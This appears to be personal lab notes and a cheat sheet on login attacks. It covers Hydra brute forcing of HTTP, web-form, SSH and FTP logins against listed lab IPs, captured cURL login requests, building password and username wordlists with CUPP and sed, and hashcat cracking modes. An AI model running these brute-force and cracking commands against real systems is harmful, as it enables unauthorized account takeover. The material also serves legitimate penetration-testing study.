Login Attacks
======

Hydra
------
To install Hydra use command `apt install hydra -y` or download from its Github Repository `git clone https://github.com/vanhauser-thc/thc-hydra`

* password wordlists /opt/useful/SecLists/Passwords/
* username wordlists /opt/useful/SecLists/Usernames/
* https://github.com/danielmiessler/SecLists
 
The most commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are. https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
/opt/useful/SecLists/Passwords/Default-Credentials
 ftp-betterdefaultpasslist.txt

### Hydra Options	Description
```-C ftp-betterdefaultpasslist.txt	Combined Credentials Wordlist
SERVER_IP	Target IP
-s PORT	Target Port
http-get	Request Method
/	Target Path```

------Basic HTTP Auth Brute Forcing------
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 46.101.20.243 -s 32221 http-get /


locate names.txt

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

static pw
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

 hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

---Brute Forcing Forms----

Determine Login Parameters
We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.

Using Browser
One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with [CTRL + SHIFT + E].

Once we do, we can simply try to login with any credentials (test:test) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data:

Another option would be to used Copy > Copy as cURL, which would copy the entire cURL command, which we can use in the Terminal to repeat the same HTTP request:


curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'


hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

hydra -l user -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 46.101.20.243 -s 32221 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='login'"

curl 'http://46.101.20.243:32221/admin_login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://46.101.20.243:32221' -H 'DNT: 1' -H 'Authorization: Basic dXNlcjpwYXNzd29yZA==' -H 'Connection: keep-alive' -H 'Referer: http://46.101.20.243:32221/admin_login.php' -H 'Cookie: PHPSESSID=hd495gtp1gu278ifim02kahvom' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'user=&pass='
Have to find verriables of USERNAME/PASSWORD , form name, ip and port, login page. 


SSH Attack
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
netstat -antp | grep -i list
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
ftp 127.0.0.1


CUPP
sudo apt install cupp or clone it from the Github repository
https://github.com/Mebus/cupp
cupp -i
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers


Custom Username Wordlist
git clone https://github.com/21y4d/usernameGenerator.git
bash usernameGenerator/usernameGenerator.sh 
bash usernameGenerator/usernameGenerator.sh Bill Gates

Hydra
Command	Description
hydra -h	hydra help
hydra -C wordlist.txt SERVER_IP -s PORT http-get /	Basic Auth Brute Force - Combined Wordlist
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /	Basic Auth Brute Force - User/Pass Wordlists
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"	Login Form Brute Force - Static User, Pass Wordlist
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4	SSH Brute Force - User/Pass Wordlists
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1	FTP Brute Force - Static User, Pass Wordlist
Wordlists
Command	Description
/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt	Default Passwords Wordlist
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt	Common Passwords Wordlist
/opt/useful/SecLists/Usernames/Names/names.txt	Common Names Wordlist
Misc
Command	Description
cupp -i	Creating Custom Password Wordlist
sed -ri '/^.{,7}$/d' william.txt	Remove Passwords Shorter Than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt	Remove Passwords With No Special Chars
sed -ri '/[0-9]+/!d' william.txt	Remove Passwords With No Numbers
git clone https://github.com/21y4d/usernameGenerator.git	Download usernameGenerator
bash usernameGenerator/usernameGenerator.sh <First Name> <Last Name>	usernameGenerator Usage
ssh b.gates@SERVER_IP -p PORT	SSH to Server
ftp 127.0.0.1	FTP to Server
su - user	Switch to User

Encryption

Generate an MD5 hash
echo -n "p@ssw0rd" | md5sum

Create the XOR ciphertext
python3
from pwn import xor 
xor("p@ssw0rd", "secret")

 pip install hashid	Install the hashid tool
sudo apt install hashcat or get from Git https://github.com/hashcat/hashcat

hashid '$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f' -m

 hash types and their corresponding examples can be found here
https://hashcat.net/wiki/doku.php?id=example_hashes


CRACKING PASSWORDS WITH HASHCAT
cheat sheet
Command	Description
 pip install hashid	Install the hashid tool
hashid <hash> OR hashid <hashes.txt>	Identify a hash with the hashid tool
hashcat --example-hashes	View a list of Hashcat hash modes and example hashes
hashcat -b -m <hash mode>	Perform a Hashcat benchmark test of a specific hash mode
hashcat -b	Perform a benchmark of all hash modes
hashcat -O	Optimization: Increase speed but limit potential password length
hashcat -w 3	Optimization: Use when Hashcat is the only thing running, use 1 if running hashcat on your desktop. Default is 2
hashcat -a 0 -m <hash type> <hash file> <wordlist>	Dictionary attack
hashcat -a 1 -m <hash type> <hash file> <wordlist1> <wordlist2>	Combination attack
hashcat -a 3 -m 0 <hash file> -1 01 'ILFREIGHT?l?l?l?l?l20?1?d'	Sample Mask attack
hashcat -a 7 -m 0 <hash file> -1=01 '20?1?d' rockyou.txt	Sample Hybrid attack
crunch <minimum length> <maximum length> <charset> -t <pattern> -o <output file>	Make a wordlist with Crunch
python3 cupp.py -i	Use CUPP interactive mode
kwp -s 1 basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route	Kwprocessor example
cewl -d <depth to spider> -m <minimum word length> -w <output wordlist> <url of website>	Sample CeWL command
hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt	Sample Hashcat rule syntax
./cap2hccapx.bin input.cap output.hccapx	cap2hccapx syntax
hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap	hcxpcaptoolsyntax
